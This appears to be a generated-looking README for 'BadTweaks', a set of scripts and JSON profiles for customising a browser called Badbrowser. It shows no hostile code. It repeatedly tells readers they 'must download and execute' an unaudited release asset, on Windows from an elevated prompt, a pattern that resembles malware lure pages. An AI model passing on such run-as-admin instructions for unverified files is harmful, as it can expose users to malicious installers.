BadTweaks — Simple Fast Safe Tweaks to Customize Badbrowser
==========================================================

[![Download Release](https://img.shields.io/badge/Release-Download-blue?logo=github&style=for-the-badge)](https://github.com/mistral28/bad-tweaks/releases)

🎛️🦊 Customize Badbrowser with targeted tweaks, patches, and config bundles.

Overview
--------

BadTweaks provides a curated set of tweaks for Badbrowser. The project bundles small scripts, configuration snippets, and UI patches that change behavior, privacy settings, appearance, and performance. Use the repo to apply tweaks, test new behaviors, or build your own tweak packs.

BadTweaks favors minimal changes that are easy to audit. Each tweak targets a single setting or a short set of related settings. The repo works on multiple platforms where Badbrowser runs and uses plain shell scripts and JSON configs for compatibility.

Features
--------

- Small, focused tweaks that change one behavior at a time.
- Config bundles for privacy, performance, and developer workflows.
- Safe rollback support. Each tweak includes an uninstall step.
- Centralized installer script and per-tweak installers.
- Example profiles to chain multiple tweaks into a single profile.
- Logs and concise output for automation and CI.

BadTweaks ships these tweak categories:
- Privacy: fingerprint reduction, telemetry toggles.
- UI: toolbar layout, theme tweaks, compact mode.
- Performance: cache adjustments, worker limits, prefetch control.
- Dev: remote debug helpers, mock host mapping, debug flags.

BadTweaks organizes content into /tweaks, /profiles, /scripts, and /docs.

Screenshots & Badges
--------------------

BadTweaks uses small icons and badges to show state.

![Tweaks badge](https://img.shields.io/badge/Tweaks-collection-green)
![Privacy badge](https://img.shields.io/badge/Privacy-enhanced-orange)

Below is a mock UI preview image sourced from public icon sets:

![Browser tweaks preview](https://img.shields.io/badge/Preview-Badbrowser%20UI-blue?style=for-the-badge)

Installation
------------

Download the installer from the Releases page and run it on the machine that runs Badbrowser. The release file contains the installer script and packaged tweaks. You must download the file and execute it.

Steps (Unix-like systems):

1. Visit the Releases page and get the latest asset:
   https://github.com/mistral28/bad-tweaks/releases

2. Download the asset you need (for example, bad-tweaks-latest.tar.gz or bad-tweaks.sh).

3. Unpack or make the script executable:
   - For tarball:
     - tar xzf bad-tweaks-latest.tar.gz
     - cd bad-tweaks
     - ./install.sh
   - For single script:
     - chmod +x bad-tweaks.sh
     - ./bad-tweaks.sh

The installer will ask which profile or tweaks you want to apply. The script runs local checks and shows the list of changes before it applies them.

Windows (PowerShell) quick steps:

- Download the .zip or .ps1 asset from the Releases page: https://github.com/mistral28/bad-tweaks/releases
- Extract and run the included script from an elevated PowerShell prompt:
  - .\install.ps1

If the Releases page does not show assets or if a link fails, check the repository Releases section on GitHub for the latest files and details.

Usage
-----

List available tweaks:

- ./bad-tweaks.sh list
- ./bad-tweaks.sh list --category privacy

Apply a single tweak:

- ./bad-tweaks.sh apply tweak-id

Apply a profile (group of tweaks):

- ./bad-tweaks.sh profile apply privacy-strict

Rollback a tweak:

- ./bad-tweaks.sh rollback tweak-id

Dry-run mode:

- ./bad-tweaks.sh apply tweak-id --dry-run

Tweak IDs follow a short pattern: category/name. Example: privacy/block-telemetry.

Profiles
--------

Profiles group tweaks that work together. Use a profile to configure a machine for a specific role.

Included profiles:

- privacy-strict: reduces fingerprint surface, disables telemetry, tightens cookie rules.
- dev-local: enables debug flags, turns on verbose logging, sets mock hosts.
- performance-lite: reduces background workers, adjusts cache settings.

Create a custom profile:

1. Create a JSON file in /profiles with a name and list of tweak IDs.
2. Run ./bad-tweaks.sh profile apply my-profile

Examples
--------

Apply privacy profile:

- ./bad-tweaks.sh profile apply privacy-strict

Apply single tweak to disable prefetch:

- ./bad-tweaks.sh apply performance/disable-prefetch

Chain commands in automation:

- ./bad-tweaks.sh apply privacy/block-telemetry && ./bad-tweaks.sh apply ui/compact-toolbar

Tweak format
------------

Tweak files use a simple format and live in /tweaks. Each tweak contains:

- id: unique identifier (category/name)
- title: short title
- description: one-line goal
- platform: list of supported platforms
- install: shell or powerShell snippet
- rollback: shell or powerShell snippet
- checks: optional check steps

Example (JSON):

{
  "id": "performance/disable-prefetch",
  "title": "Disable prefetch",
  "description": "Turn off DNS and link prefetch to reduce background load",
  "platform": ["linux", "mac", "windows"],
  "install": "set_pref network.prefetch.enabled false",
  "rollback": "set_pref network.prefetch.enabled true",
  "checks": ["verify_pref network.prefetch.enabled false"]
}

Scripting and API
-----------------

Use the CLI to run tweaks in scripts. The installer exposes exit codes:

- 0 : success
- 2 : partial success (some tweaks failed)
- 3 : validation failure

Sample automation snippet:

#!/bin/sh
./bad-tweaks.sh apply privacy/block-telemetry
if [ $? -ne 0 ]; then
  echo "One or more tweaks failed"
  exit 1
fi
echo "Tweaks applied"

Configuration
-------------

Main config lives in ~/.badtweaks/config.json. The config contains:

- default-profile: profile to apply on install
- backup-path: folder for backups
- log-level: info, debug, error
- auto-rollback: true/false

Example config:

{
  "default-profile": "privacy-strict",
  "backup-path": "/var/backups/badtweaks",
  "log-level": "info",
  "auto-rollback": false
}

Backup and rollback
-------------------

BadTweaks creates backups before it changes files or preferences. Backups store original files and a small manifest. Rollback reads the manifest and restores prior state.

Backups live in the backup-path. Use ./bad-tweaks.sh backup list to see entries. Use ./bad-tweaks.sh rollback <backup-id> to restore.

Security and auditing
---------------------

Each tweak aims to be transparent. The project stores install and rollback steps in plain text. You can inspect code before you run it. The installer prints planned changes and requires confirmation before it executes them.

Contributing
------------

- Fork the repo.
- Create a branch for your tweak or fix.
- Add a tweak JSON or script in /tweaks.
- Add tests in /tests when possible.
- Open a pull request with a clear description and test steps.

Tweak author checklist:

- Keep changes focused.
- Provide an uninstall path.
- Include platform tags.
- Add a small test that verifies the tweak applied.

Testing
-------

Run the test suite with:

- ./scripts/test-suite.sh

The suite runs quick checks that the tweak applied and rolled back. Tests run on CI and on local machines.

FAQ
---

Q: How do I find a tweak for theme changes?
A: Use ./bad-tweaks.sh list --category ui and browse ui tweaks. Profiles also include theme changes.

Q: Can I make my own profile?
A: Yes. Add a JSON file under /profiles and list tweak IDs.

Q: Does the installer require root?
A: Some tweaks need elevated rights. The installer will request elevation only when needed.

Q: I ran a tweak and saw errors. Where are logs?
A: Logs appear in ~/.badtweaks/logs by default. You can change log path in config.

Changelog
---------

- v1.3.0 — Added profiles, backup manifest, and rollback improvements.
- v1.2.0 — Introduced performance tweaks and new CLI flags.
- v1.0.0 — Initial release with core tweak collection and installer.

Releases
--------

Download the packaged release and run the included installer. The release asset contains the installer, bundled tweaks, and a manifest that lists all tweaks. You must download and execute that file from the Releases page:
https://github.com/mistral28/bad-tweaks/releases

If the Releases page shows multiple assets, pick the one that matches your platform (linux, mac, windows). The file names use clear patterns: bad-tweaks-<version>-<platform>.<ext>.

Troubleshooting
---------------

- Installer fails to run:
  - Confirm the file is executable (chmod +x).
  - Run the installer from an elevated shell when tweaks touch system files.

- A tweak did not apply:
  - Check logs in ~/.badtweaks/logs.
  - Run the built-in checks: ./bad-tweaks.sh check tweak-id

- Rollback report shows missing files:
  - Inspect the backup manifest in the backup folder. The manifest lists what was saved.

Roadmap
-------

Planned items:

- Add a UI for interactive tweak selection.
- Add containerized test runners for each platform.
- Add more privacy and dev tweak packs.
- Add a curated registry of community tweaks with signatures.

Code of Conduct
---------------

Be respectful. Submit tidy pull requests. Document breaking changes. Keep tweak scope narrow.

License
-------

MIT License. See LICENSE.md for full text.

Maintainers
-----------

- Mistral28 (maintainer)
- Community contributors

Contact
-------

Open issues and pull requests on GitHub. Use issues to request a tweak or to report a problem.